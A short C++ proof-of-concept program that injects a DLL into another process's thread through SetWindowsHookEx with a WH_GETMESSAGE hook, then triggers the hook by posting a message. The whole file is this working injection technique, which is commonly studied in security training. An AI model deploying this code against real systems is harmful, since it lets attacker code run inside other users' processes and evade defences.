#include <Windows.h>
#include <iostream>

using namespace std;

int main() {
	// Get The Thread ID value from the user
	cout << "SetWindowsHookEx Injection" << endl << endl;
	int tId;
	cout << "[+] Enter Target TID : ";
	cin >> tId;
	cout << endl;

	// Load the dll
	HMODULE hModule = LoadLibrary(L"c:\\messageboxexp.dll");
	
	// Get address of the exported function from the dll
	HOOKPROC f = (HOOKPROC)GetProcAddress(hModule, "messageboxexport");

	// Set hook 
	HHOOK hook = SetWindowsHookExA(WH_GETMESSAGE, f, hModule, tId);

	// Trigger the hook
	PostThreadMessage(tId, WM_NULL, NULL, NULL);
	Sleep(10 * 1000);
	UnhookWindowsHookEx(hook);

	return 0;
}

